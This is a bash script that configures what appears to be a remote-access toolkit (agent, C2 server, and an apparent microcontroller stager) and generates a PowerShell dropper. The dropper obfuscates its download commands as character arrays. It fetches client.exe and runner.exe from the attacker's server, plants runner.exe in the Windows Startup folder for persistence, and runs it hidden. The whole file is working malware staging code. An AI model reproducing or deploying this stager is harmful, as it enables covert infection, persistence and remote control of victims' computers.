#!/bin/bash

PORT="1234"
SERVERIP="192.168.1.101"

AGENT_PROGRAM=client.py
STAGER_INO=scrennshareStager.ino
C2_PROGRAM=server.py

AGENT_STAGER=""
RUNNER_STAGER=""
# Function to convert a string to a character array
agent_stager() {
    local input_string="Invoke-WebRequest -Uri \"http://${SERVERIP}/\$executableName\" -OutFile \$outputPath -ErrorAction Stop"
    local -a char_array=() # Declare an empty array

    # Loop through each character of the string
    for (( i=0; i<${#input_string}; i++ )); do
        char_array+=("${input_string:$i:1}") # Append each character to the array
    done

    local output=""
    for char in "${char_array[@]}"; do
        if [[ -n "$output" ]]; then
            output+=", "
        fi
        output+="'$char'"
    done
    AGENT_STAGER="$output"
}
runner_stager() {
    local input_string="Invoke-WebRequest -Uri \"http://${SERVERIP}/\$runnerName\" -OutFile \$outputRunnerPath -ErrorAction Stop"
    local -a char_array=() # Declare an empty array

    # Loop through each character of the string
    for (( i=0; i<${#input_string}; i++ )); do
        char_array+=("${input_string:$i:1}") # Append each character to the array
    done

    local output=""
    for char in "${char_array[@]}"; do
        if [[ -n "$output" ]]; then
            output+=", "
        fi
        output+="'$char'"
    done
    RUNNER_STAGER="$output"
}


check_err() {
    if [ $# -gt 0 ]; then
        if [ $? -eq 0 ]; then
            echo "$1 changed"
        else
            echo "Failed to change $1"
            exit 1
        fi
    else
        echo "Not enough argument"
        exit 1
    fi
}

# Check if an argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 \"<your string>\""
    echo "Example: $0 \"hello world\""
    exit 1
fi

while getopts "h:p:" arg; do
    case $arg in
        h)
            SERVERIP="$OPTARG"
            ;;
        p)
            PORT="$OPTARG"
            ;;
    esac
done

# client.py
echo "Changing params from ${AGENT_PROGRAM}"
sed -i "s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}/$SERVERIP/" "${AGENT_PROGRAM}"
sed -i -E "s/SERVER_PORT = [0-9]+/SERVER_PORT = $PORT/" "${AGENT_PROGRAM}"
check_err "${AGENT_PROGRAM}"

# screeenshareStager.ino
echo "Changing params from ${STAGER_INO}"
sed -i "s#http://\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}#http://$SERVERIP#" "${STAGER_INO}"
check_err "${STAGER_INO}"

# server.py
#PORT = 1234 
echo "Changing params from ${C2_PROGRAM}"
sed -i -E "s/PORT = [0-9]+/PORT = $PORT/" "${C2_PROGRAM}"
check_err "${C2_PROGRAM}"

# Prepare stager powershell script 
agent_stager
runner_stager

# Invoke-WebRequest -Uri "http://192.168.1.101/$executableName" -OutFile $outputPath -ErrorAction Stop
# Invoke-WebRequest -Uri "http://192.168.1.101/$runnerName" -OutFile $outputRunnerPath -ErrorAction Stop


echo "Preparing stager powershell script"
cat << EOF > stager.ps1
\$targetDirectory = \$env:LOCALAPPDATA
\$executableName = "client.exe"
\$outputPath = Join-Path -Path \$targetDirectory -ChildPath \$executableName


\$appDataRoaming = \$env:APPDATA
\$startupPath = Join-Path \$appDataRoaming "Microsoft\Windows\Start Menu\Programs\Startup"
\$runnerName = "runner.exe"
\$outputRunnerPath = Join-Path -Path \$startupPath -ChildPath \$runnerName


\$WRARR = ${AGENT_STAGER}
\$RNARR = ${RUNNER_STAGER}

\$WR = -join \$WRARR
\$RN = -join \$RNARR

Invoke-Expression \$WR
Invoke-Expression \$RN

Start-Sleep -Seconds 10

Start-Process -FilePath "\$outputRunnerPath" -WindowStyle Hidden
EOF
echo "Powershell script is ready"